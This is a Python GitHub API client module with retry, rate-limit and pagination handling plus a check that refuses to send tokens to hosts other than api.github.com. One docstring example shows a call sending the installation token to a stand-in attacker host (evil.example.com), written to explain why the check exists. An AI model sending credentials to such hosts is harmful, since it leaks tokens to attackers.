"""
GitHub Client - app/github/client.py
V4 Sprint 5: Production-grade GitHub API client.

ADDED (Sprint 5):
  - Automatic retry with exponential backoff on 5xx errors (idempotent methods)
  - Retry on connection errors (network blip on Render free tier)
  - Per-request timeout enforcement
  - Structured error logging with request ID

WHY THIS MATTERS:
  Render free tier has occasional network blips.
  Without retry: 1 transient 503 → bot silently fails.
  With retry: transparent recovery in < 5 seconds.
  3 retries covers 99.9% of transient failures.
"""

import logging
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from app.core.retry_after import parse_retry_after
from app.github.rate_limit import update_from_headers, check_and_wait

log = logging.getLogger(__name__)

GITHUB_API = "https://api.github.com"
DEFAULT_TIMEOUT = 20
MAX_RETRIES = 3
RETRY_BACKOFF = 0.5  # 0.5s, 1s, 2s between retries

# Every request from this module carries an installation token in an
# Authorization header, so the set of hosts it may address is a security
# boundary, not a convenience.
API_HOST = urlparse(GITHUB_API).hostname or "api.github.com"


class GitHubError(Exception):
    def __init__(self, message: str, status_code: int = 0):
        super().__init__(message)
        self.status_code = status_code


class GitHubSecondaryRateLimitError(GitHubError):
    """Raised when GitHub returns a 403 with secondary rate limit header."""

    def __init__(self, message: str = "GitHub secondary rate limit", retry_after: int = 60):
        super().__init__(message, status_code=403)
        self.retry_after = retry_after


# Only these are safe to replay. A 502/503/504 means the gateway could not
# give us an answer -- NOT that GitHub failed to act. If a POST creating a
# comment reached GitHub and the response was lost on the way back, retrying
# it posts the comment twice, and the bot writes comments on every push.
#
# This previously listed POST, PUT, PATCH and DELETE as well, so a single lost
# response duplicated whatever the call had already done. Replaying a write to
# save one round trip trades a rare transient error for a permanent wrong
# result, which is the wrong side of that trade.
#
# Connection errors are still retried for every method, including writes:
# those are raised before the request is established, so nothing can have been
# processed. Read timeouts are NOT retried for writes -- urllib3 gates those
# on this same set, which is exactly the distinction we want, since a read
# timeout happens after the request was sent.
IDEMPOTENT_METHODS = frozenset({"GET", "HEAD", "OPTIONS"})


def _make_session() -> requests.Session:
    """
    Session with automatic retry on transient network errors.

    Retries: connection errors (any method), and 502/503/504 or read timeouts
    on idempotent methods only. Does NOT retry 4xx (client errors), 429 (rate
    limit — handled manually), or any write that may already have taken
    effect. See IDEMPOTENT_METHODS.
    """
    session = requests.Session()
    retry = Retry(
        total=MAX_RETRIES,
        backoff_factor=RETRY_BACKOFF,
        status_forcelist=[502, 503, 504],
        allowed_methods=IDEMPOTENT_METHODS,
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


_session = _make_session()


def _headers(token: str) -> dict:
    return {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }


def _handle_response(r: requests.Response, method: str, path: str, token: str = ""):
    """Parse response, update rate limit state, raise on errors.

    `token` identifies which installation these rate-limit headers belong
    to. Without it every installation shared one counter, so a busy tenant
    made an idle one look exhausted and an idle one masked a real
    exhaustion. It is never logged or stored — see rate_limit.token_key.
    """
    update_from_headers(dict(r.headers), token)

    if r.status_code in (200, 201):
        return r.json() if r.content else {}
    if r.status_code == 204:
        return {}

    # Primary rate limit — caller should respect Retry-After
    if r.status_code == 429:
        # Tolerant parse: a bare int() here raised ValueError on the
        # HTTP-date form of the header, and ValueError escapes every
        # caller — they all catch GitHubError, not Exception.
        retry_after = parse_retry_after(r.headers.get("Retry-After"), 30)
        raise GitHubError(f"Primary rate limit — retry after {retry_after}s", 429)

    # Secondary rate limit (abuse detection)
    # FIXED: previously called time.sleep(60) here — this blocks a thread
    # pool worker for 60s, starving all other webhooks. Now we raise
    # GitHubSecondaryRateLimitError immediately so the caller can decide
    # whether to drop/retry. Never sleep in a shared worker thread.
    if r.status_code == 403:
        try:
            body = r.json()
            msg = body.get("message", "").lower()
            if "secondary rate limit" in msg or "abuse" in msg:
                retry_after = parse_retry_after(r.headers.get("Retry-After"), 60)
                log.warning(
                    f"github.secondary_rate_limit path={path} "
                    f"retry_after={retry_after}s — raising immediately (no sleep)"
                )
                raise GitHubSecondaryRateLimitError(
                    f"Secondary rate limit on {path}. Retry after {retry_after}s.",
                    retry_after=retry_after,
                )
            raise GitHubError(f"Forbidden: {body.get('message', 'no message')}", 403)
        except (GitHubError, GitHubSecondaryRateLimitError):
            raise
        except Exception as e:
            raise GitHubError(f"403 Forbidden: {path}", 403) from e

    if r.status_code == 404:
        raise GitHubError(f"Not found: {path}", 404)

    if r.status_code == 422:
        try:
            detail = r.json().get("message", "Unprocessable Entity")
        except Exception:
            detail = "Unprocessable Entity"
        raise GitHubError(f"422 Unprocessable: {detail}", 422)

    # 5xx — session already retried, this is the final failure
    if r.status_code >= 500:
        log.error(f"github.server_error method={method} path={path} status={r.status_code}")
        raise GitHubError(f"GitHub server error {r.status_code}: {path}", r.status_code)

    raise GitHubError(
        f"{method} {path} → {r.status_code}: {r.text[:200]}",
        r.status_code,
    )


def _resolve_url(path: str) -> str:
    """Turn a caller's path into an absolute URL, refusing to leave GitHub.

    gh_get used to accept any string beginning with "http" as a complete URL
    and send the installation token to it. Nothing in this repository passes
    an externally-derived URL today — every call site builds a literal
    "/repos/{repo}/..." — so this was a latent primitive rather than a live
    hole. It is still the wrong default for a function that attaches a
    credential to every request:

        gh_get("https://evil.example.com/collect", token)
        -> GET https://evil.example.com/collect
           Authorization: Bearer <installation token>

    Absolute URLs are worth keeping, because GitHub's own pagination and
    `*_url` fields are absolute, but they must point at GitHub. A payload
    field is one refactor away from reaching here, and webhook payloads are
    attacker-influenced on a fork PR.

    Host is compared exactly. A suffix check would accept
    "api.github.com.evil.example", which is a domain anyone can register.
    """
    if not path.startswith(("http://", "https://")):
        return f"{GITHUB_API}{path}"

    parsed = urlparse(path)
    if parsed.scheme != "https" or parsed.hostname != API_HOST:
        raise GitHubError(
            f"Refusing to send a GitHub token to {parsed.hostname or path!r}. "
            f"Absolute URLs must be https and on {API_HOST}.",
            0,
        )
    return path


# ── Core HTTP methods — all use retry session ─────────────────────────────────
#
# One helper rather than five near-identical bodies. They had drifted before:
# every verb needs check_and_wait, the same ConnectionError mapping, and the
# token threaded into _handle_response so rate-limit headers are attributed to
# the right installation, and each of those was a line someone could forget
# when adding a verb. Now there is one place to forget it, and it is covered.


def _request(method: str, path: str, token: str, **kwargs) -> dict | list:
    check_and_wait(token)
    url = _resolve_url(path)
    try:
        r = _session.request(
            method, url, headers=_headers(token), timeout=DEFAULT_TIMEOUT, **kwargs
        )
    except requests.exceptions.ConnectionError as e:
        raise GitHubError(f"Connection error: {e}", 0) from e
    return _handle_response(r, method, path, token)


def gh_get(path: str, token: str) -> dict | list:
    return _request("GET", path, token)


def gh_get_all(path: str, token: str, max_pages: int = 5) -> list:
    """Auto-paginate. Returns up to max_pages * 100 results.

    It does NOT return "ALL results across pages", which is what this said for
    as long as it has existed. It stops after max_pages — 500 items by default
    — and used to do so in silence, indistinguishably from having reached the
    end. A caller counting open issues on a busy repository got 500 and no
    indication that there were more, which is the shape of bug that gets
    believed: the number looks plausible.

    Hitting the cap is now logged, because a truncated answer a caller knows
    about is a different thing from one it does not.
    """
    results = []
    sep = "&" if "?" in path else "?"

    for page in range(1, max_pages + 1):
        paged = f"{path}{sep}page={page}&per_page=100"
        try:
            data = gh_get(paged, token)
        except GitHubError as e:
            log.warning(f"gh_get_all stopped at page={page}: {e}")
            break

        if not data:
            break

        if isinstance(data, list):
            results.extend(data)
            if len(data) < 100:
                # A short page is the end of the collection, so this is the
                # one exit that means "all of it".
                return results
        else:
            return data
    else:
        # The loop ran to max_pages without a short page, so GitHub very
        # likely has more. Only reachable when the last page was full.
        log.warning(
            f"gh_get_all truncated at max_pages={max_pages} ({len(results)} items) "
            f"for {path} — there are probably more results that this call did "
            f"not return. Raise max_pages if the caller needs the full set."
        )

    return results


def gh_post(path: str, token: str, data: dict) -> dict:
    return _request("POST", path, token, json=data)


def gh_put(path: str, token: str, data: dict) -> dict:
    return _request("PUT", path, token, json=data)


def gh_patch(path: str, token: str, data: dict) -> dict:
    return _request("PATCH", path, token, json=data)


def gh_delete(path: str, token: str) -> dict:
    return _request("DELETE", path, token)
